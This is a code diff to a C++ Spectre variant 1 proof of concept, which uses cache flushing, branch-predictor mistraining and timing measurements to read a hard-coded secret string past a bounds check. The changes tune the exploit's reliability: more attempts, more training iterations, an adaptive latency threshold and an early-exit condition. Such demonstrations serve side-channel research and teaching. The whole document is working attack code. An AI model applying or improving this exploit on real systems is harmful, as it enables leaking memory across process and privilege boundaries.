@@ -4,6 +4,7 @@
 #include <stdint.h>
 #include <string>
 #include <x86intrin.h> /* for rdtscp and clflush */
+#include <numeric>
 
 /********************************************************************
 Victim code.
@@ -16,7 +17,12 @@ uint8_t unused2[64];
 
 const char *secret = "Minecraft ONE LOVE";
 
-static void force_read(uint8_t *p) { asm volatile("" : : "r"(*p) : "memory" ); }
+static void force_read(uint8_t *p) {
+  asm volatile(""
+               :
+               : "r"(*p)
+               : "memory");
+}
 
 static int64_t read_tsc() {
   unsigned int junk;
@@ -54,23 +60,22 @@ void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2]) {
   memset(timing_array, 1, sizeof(timing_array));
 
   auto scores = std::array<int, 256>{};
+  auto latencies = std::array<int64_t, 256>{};
 
   int best = 0;
   int second_best = 0;
   size_t training_x, x;
-  uint64_t time1, time2;
 
-  for (int tries = 100; tries > 0; tries--) {
+  for (int tries = 1000; tries > 0; tries--) {
     /* Flush timing_array[256*(0..255)] from cache */
     for (int i = 0; i < 256; i++)
       _mm_clflush(&timing_array[i * 512]); /* intrinsic for clflush instruction */
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
-    for (int j = 40; j >= 0; j--) {
+    for (int j = 256; j >= 0; j--) {
       _mm_clflush(&array1_size);
       for (volatile int z = 0; z < 100; z++) {
-
       } /* Delay (can also mfence) */
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
@@ -88,21 +93,28 @@ void readMemoryByte(size_t malicious_x, int32_t value[2], int32_t score[2]) {
     unsigned int junk = 0;
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
-    for (int i = 0; i < 256; i++) {
-      int mix_i = ((i * 167) + 13) & 255;
-      volatile uint8_t *addr = &timing_array[mix_i * 512];
-      time1 = read_tsc(); /* READ TIMER */
-      junk = *addr; /* MEMORY ACCESS TO TIME */
-      time2 = read_tsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      if (time2 <= CACHE_HIT_THRESHOLD) // && mix_i != array1[tries % array1_size])
-        scores[mix_i]++; /* cache hit - add +1 to score for this value */
+    for (int i = 0; i < 256; ++i) {
+      int mixed_i = ((i * 167) + 13) & 0xFF;
+      uint8_t *timing_addr = &timing_array[mixed_i * 512];
+      int64_t start = read_tsc(); /* READ TIMER */
+      force_read(timing_addr); /* MEMORY ACCESS TO TIME */
+      latencies[mixed_i] = read_tsc() - start;
+    }
+
+    int64_t avg_latency = std::accumulate(latencies.begin(), latencies.end(), 0) / latencies.size();
+
+    for (int i = 0; i < 256; ++i) {
+      if (latencies[i] < (avg_latency * 3 / 4)) {
+        ++scores[i];
+      }
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
     std::tie(best, second_best) = top_two_scores(scores);
 
-    // if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-    //   break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+    if (scores[best] > (2 * scores[second_best] + 400)) {
+      break;
+    }
   }
   // results[0] ^= junk; /* use junk so code above won't get optimized out*/
   value[0] = best;
